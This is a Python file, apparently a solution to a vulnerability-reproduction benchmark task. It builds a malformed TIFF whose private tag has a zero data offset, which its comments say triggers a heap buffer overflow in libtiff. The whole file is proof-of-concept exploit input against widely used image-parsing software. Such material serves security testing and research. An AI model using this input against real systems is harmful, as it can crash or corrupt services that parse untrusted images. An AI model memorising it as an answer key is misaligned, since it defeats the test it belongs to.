import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal TIFF with an invalid offline tag (offset 0)
        # that triggers heap buffer overflow in libtiff
        
        # TIFF header (little-endian)
        data = bytearray()
        data.extend(b'II')  # Little-endian
        data.extend(struct.pack('<H', 42))  # TIFF version
        data.extend(struct.pack('<I', 8))   # Offset to first IFD
        
        # First IFD starts at offset 8
        # We'll create 2 directory entries to reach required size
        ifd_offset = 8
        
        # Build IFD with 2 entries
        ifd = bytearray()
        ifd.extend(struct.pack('<H', 2))  # Number of entries
        
        # Entry 1: ImageWidth (normal tag)
        ifd.extend(struct.pack('<H', 256))  # Tag: ImageWidth
        ifd.extend(struct.pack('<H', 4))    # Type: LONG
        ifd.extend(struct.pack('<I', 1))    # Count: 1
        ifd.extend(struct.pack('<I', 100))  # Value: 100 pixels
        
        # Entry 2: Invalid offline tag with offset 0 (triggers vulnerability)
        ifd.extend(struct.pack('<H', 0x8000))  # Private tag > 32767
        ifd.extend(struct.pack('<H', 2))       # Type: ASCII
        ifd.extend(struct.pack('<I', 100))     # Count: 100 bytes
        ifd.extend(struct.pack('<I', 0))       # Offset: ZERO (invalid!)
        
        # Next IFD offset (0 = end)
        ifd.extend(struct.pack('<I', 0))
        
        # Combine header and IFD
        data.extend(ifd)
        
        # Add padding to reach exactly 162 bytes
        current_len = len(data)
        if current_len < 162:
            data.extend(b'A' * (162 - current_len))
        
        return bytes(data)